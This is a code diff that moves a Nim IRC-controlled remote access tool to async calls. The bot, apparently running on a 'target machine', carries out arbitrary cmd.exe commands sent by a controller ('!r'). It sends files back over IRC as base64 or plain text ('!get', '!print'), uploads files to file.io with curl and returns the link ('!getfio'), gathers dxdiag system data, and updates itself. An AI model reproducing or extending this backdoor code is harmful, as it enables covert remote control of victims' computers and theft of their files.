@@ -1,4 +1,4 @@
-import irc, strutils, osproc, os, zippy, base64, math, update_handler, json
+import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch
 
 let
     g_dbg* = true
@@ -15,7 +15,7 @@ type
 
 
 
-proc helper_secondsToMinutesAndSeconds(seconds: int): string =
+proc helper_secondsToMinutesAndSeconds(seconds: int): Future[string] {.async.} =
     let minutes = seconds div 60
     let remainingSeconds = seconds mod 60
     return $minutes & "min " & $remainingSeconds & "sec"
@@ -24,7 +24,7 @@ proc helper_secondsToMinutesAndSeconds(seconds: int): string =
 
 ## Recombine trailing tokens
 ## Required if the parameter is just one long string that included spaces
-proc helper_recombine(tokens:seq[string], start = 1):string =
+proc helper_recombine(tokens:seq[string], start = 1):Future[string] {.async.} =
     var first = true
     for i in start..<len(tokens):
         if first:
@@ -36,7 +36,7 @@ proc helper_recombine(tokens:seq[string], start = 1):string =
 
 
 ## Slice a long message into an array of strings that fit the message length limit
-proc helper_chopString(victim:string):seq[string] =
+proc helper_chopString(victim:string):Future[seq[string]] {.async.} =
     var i:int
     while i < len(victim):
         if i+g_msg_length < len(victim):
@@ -50,7 +50,7 @@ proc helper_chopString(victim:string):seq[string] =
 
 ## Check to see if a message will take a long time to display be sent
 ## User will be informed of duration and what to do if it breaches the max transfer time
-proc helper_checkSendDuration(event: IrcEvent, client:Irc, msg:string): bool =
+proc helper_checkSendDuration(event: IrcEvent, client:AsyncIrc, msg:string): Future[bool] {.async.} =
     var
         transfer_linecount:int = 0
         transfer_duration:int
@@ -62,20 +62,20 @@ proc helper_checkSendDuration(event: IrcEvent, client:Irc, msg:string): bool =
         transfer_linecount += int(math.floor(len(line) / g_msg_length)) + 1
     
     transfer_duration = transfer_linecount * g_msg_send_time
-    transfer_durStr = helper_secondsToMinutesAndSeconds(transfer_duration)
+    transfer_durStr = await helper_secondsToMinutesAndSeconds(transfer_duration)
 
 
-    client.privmsg(event.origin, "DATA incoming, no. of messages: " & $transfer_linecount & ", ~duration: " & transfer_durStr)
+    discard client.privmsg(event.origin, "DATA incoming, no. of messages: " & $transfer_linecount & ", ~duration: " & transfer_durStr)
 
     if (transfer_duration > g_msg_max_transfer_time):
-        client.privmsg(event.origin, "WARNING: the transfer will take more than " & $g_msg_max_transfer_time & "s. you need to force this command using '!' as the last token")
+        discard client.privmsg(event.origin, "WARNING: the transfer will take more than " & $g_msg_max_transfer_time & "s. you need to force this command using '!' as the last token")
         return false
     else:
         return true
 
 
 
-proc rexec_runCommand(cmd:string):ExecRespose =
+proc rexec_runCommand(cmd:string):Future[ExecRespose] {.async.} =
     var 
         output:string
         exitcode:int    
@@ -86,7 +86,7 @@ proc rexec_runCommand(cmd:string):ExecRespose =
 
 
 ## Because just using cd with execCmdEx doesnt do anything
-proc rexec_changeDir(path:string):bool =
+proc rexec_changeDir(path:string):Future[bool] {.async.} =
     if os.dirExists(path):
         os.setCurrentDir(path)
         return true
@@ -98,13 +98,13 @@ proc rexec_changeDir(path:string):bool =
 
 
 ## Uploads target file from target machine to file.io, sends link to controller
-proc cmd_getFileIO(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) = 
-    var filename = helper_recombine(tokens,1)
+proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
+    var filename = await helper_recombine(tokens,1)
 
     if fileExists(filename):
         try:
             var
-                (output, _ ) = execCmdEx("cmd.exe /C start /B curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+                (output, _ ) = execCmdEx("cmd.exe /C curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
                 trash:string
                 i:int = 0
 
@@ -133,8 +133,8 @@ proc cmd_getFileIO(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
 
 ## Downloads the specified file, compresses it as .gz and sends it encoded as base64
 ## A very slow file transfer, maybe implement DCC somehow??
-proc cmd_get(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) = 
-    var filename = helper_recombine(tokens,1)
+proc cmd_get(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
+    var filename = await helper_recombine(tokens,1)
 
     if fileExists(filename):
         if g_dbg: echo "Opening file"
@@ -144,16 +144,16 @@ proc cmd_get(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
         var cfile = compress(filestr)
         var b64_cfile = encode(cfile)
         
-        if(not helper_checkSendDuration(event, client, b64_cfile) and not force):
+        if(not (await helper_checkSendDuration(event, client, b64_cfile)) and not force):
             return
 
         var i = 0
 
         while i < len(b64_cfile):
             if i+g_msg_length < len(b64_cfile):
-                client.privmsg(event.origin, b64_cfile[i..i+g_msg_length])
+                discard client.privmsg(event.origin, b64_cfile[i..i+g_msg_length])
             else:
-                client.privmsg(event.origin, b64_cfile[i..high(b64_cfile)])
+                discard client.privmsg(event.origin, b64_cfile[i..high(b64_cfile)])
                 break
             i+=g_msg_length+1
         close(file)
@@ -166,24 +166,24 @@ proc cmd_get(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
 
 
 ## Similar to cmd_get, but sends the file's contents as plain text
-proc cmd_print(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) = 
-    var filename = helper_recombine(tokens,1)
+proc cmd_print(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
+    var filename = await helper_recombine(tokens,1)
 
     if fileExists(filename):
         var file = open(filename)
         var filestr = file.readAll()
             
-        if(not helper_checkSendDuration(event, client, fileStr) and not force):
+        if(not (await helper_checkSendDuration(event, client, fileStr)) and not force):
             return
 
         for line in filestr.splitLines():
             if strip(line) == "": continue
             if len(line) > g_msg_length:
-                var line_copped = helper_chopString(line)
+                var line_copped = await helper_chopString(line)
                 for morsel in line_copped:
-                    client.privmsg(event.origin, morsel)
+                    discard client.privmsg(event.origin, morsel)
             else:
-                client.privmsg(event.origin, line)
+                discard client.privmsg(event.origin, line)
 
         close(file)
 
@@ -195,8 +195,8 @@ proc cmd_print(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
 
 
 ## Runs dxdiag and sends the output text file using cmd_get
-proc cmd_dxdiag(event:IrcEvent, client:Irc) =
-    client.privmsg(event.origin,"one moment")
+proc cmd_dxdiag(event:IrcEvent, client:AsyncIrc) {.async.} =
+    discard client.privmsg(event.origin,"one moment")
     if g_dbg: echo "Starting dxdiag"
     var 
         cmd:string = "cmd.exe /c dxdiag /dontskip /t dxdiag_file.txt"
@@ -205,18 +205,33 @@ proc cmd_dxdiag(event:IrcEvent, client:Irc) =
     (outputx,exitcodex) = execCmdEx(cmd, options = {poUsePath})
 
     if g_dbg: echo "Checking file"
-    cmd_get(event, client, @["dxdiag_file.txt"], true)
+    await cmd_get(event, client, @["dxdiag_file.txt"], true)
     removeFile("dxdiag_file.txt")
 
     if g_dbg: echo "Dxdiag command done"
 
 
+proc cmd_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event:IrcEvent) {.async.} =
+    while not response.finished() and not response.failed():
+        await sleepAsync(1000)
+    
+    if not response.failed():
+        if response.read().exitCode == 0:
+            var value:string = response.read().output
+            for line in value.splitLines():
+                discard client.privmsg(event.origin, line)
+        else:
+            discard client.privmsg(event.origin, "Error [ "  & $response.read().exitCode & " ]")
+    else:
+        discard client.privmsg(event.origin, "cmd: future failed")
+
+
 
 ## Processes !rexec
 ## Contains some shortcuts for certain functions, everything else just gets sent to rexec_runCommand
-proc cmd_rexec(event:IrcEvent, client:Irc, tokens:seq[string]) =
+proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
     if len(tokens) < 2:
-        client.privmsg(event.origin, "too short")
+        discard client.privmsg(event.origin, "too short")
         return
 
     var
@@ -226,42 +241,42 @@ proc cmd_rexec(event:IrcEvent, client:Irc, tokens:seq[string]) =
     case tokens[1]:
     of "cd":
         if len(tokens) == 2:
-            response = rexec_runCommand("echo %CD%")
-            caught = true
+            #response = await rexec_runCommand("echo %CD%")
+            discard cmd_responseHandler(rexec_runCommand("echo %CD%"), client, event)
+            #caught = true
         else:
-            var path = helper_recombine(tokens,2)
-            if rexec_changeDir(path):
+            var path = await helper_recombine(tokens,2)
+            if await rexec_changeDir(path):
                 caught = true
-                client.privmsg(event.origin, "cwd: " & path)
+                discard client.privmsg(event.origin, "cwd: " & path)
             else:
-                client.privmsg(event.origin, "cwd: no such directory")
+                discard client.privmsg(event.origin, "cwd: no such directory")
+
+
     of "cd..":
-        response = rexec_runCommand("cd ..")
-        caught = true
+        #response = await rexec_runCommand("cd ..")
+        discard cmd_responseHandler(rexec_runCommand("cd .."), client, event)
+        #caught = true
     of "ls":
-        response = rexec_runCommand("dir /w")
-        caught = true
+        #response = await rexec_runCommand("dir /w")
+        discard cmd_responseHandler(rexec_runCommand("dir /w"), client, event)
+        #caught = true
     else:
         var args:string
-        args = helper_recombine(tokens)
+        args = await helper_recombine(tokens)
         
         if g_dbg: echo "ARGS: " & args
 
-        response = rexec_runCommand(args)
+        discard cmd_responseHandler(rexec_runCommand(args), client, event)
 
-        if response.exitCode != 0:
-            client.privmsg(event.origin, "Error [ "  & $response.exitCode & " ]")
-        else:
-            caught = true
-
-    if caught:
-        for line in response.output.splitLines():
-            client.privmsg(event.origin, line)
+    # if caught:
+    #     for line in response.output.splitLines():
+    #         client.privmsg(event.origin, line)
 
 
 
 ## Checks if a private message was a command and calls appropriate functions
-proc cmdh_handle*(event:IrcEvent, client:Irc) =
+proc cmdh_handle*(event:IrcEvent, client:AsyncIrc) {.async.} =
     var
         msg = event.params[event.params.high]
         tokens:seq[string]
@@ -273,31 +288,31 @@ proc cmdh_handle*(event:IrcEvent, client:Irc) =
             tokens.add(token.token)
 
     case tokens[0]:
-    of "!hey": client.privmsg(event.origin, "heyyy v" & $current_version)
-    of "!lag":  client.privmsg(event.origin, formatFloat(client.getLag))
+    of "!hey": discard client.privmsg(event.origin, "heyyy v" & $current_version)
+    of "!lag": discard client.privmsg(event.origin, formatFloat(client.getLag))
     of "!excessFlood":
         for i in 0..10:
-            client.privmsg(event.origin, "TEST" & $i)
+            discard client.privmsg(event.origin, "TEST" & $i)
     of "!dxdiag":
-        cmd_dxdiag(event, client)
+        discard cmd_dxdiag(event, client)
     of "!r": #remote execution
-        cmd_rexec(event, client, tokens)
+        discard cmd_rexec(event, client, tokens)
     of "!getfio":
-        cmd_getFileIO(event, client, tokens, false)
+        discard cmd_getFileIO(event, client, tokens, false)
     of "!get":
         if tokens[high(tokens)] == "!":
             var ftokens = tokens
             ftokens.delete(high(tokens))
-            cmd_get(event, client, ftokens, true)
+            discard cmd_get(event, client, ftokens, true)
         else:
-            cmd_get(event, client, tokens, false)
+            discard cmd_get(event, client, tokens, false)
     of "!print":
         if tokens[high(tokens)] == "!":
             var ftokens = tokens
             ftokens.delete(high(tokens))
-            cmd_print(event, client, ftokens, true)
+            discard cmd_print(event, client, ftokens, true)
         else:
-            cmd_print(event, client, tokens, false)
+            discard cmd_print(event, client, tokens, false)
     of "!update":
         discard updt_check(true , client, event)
             
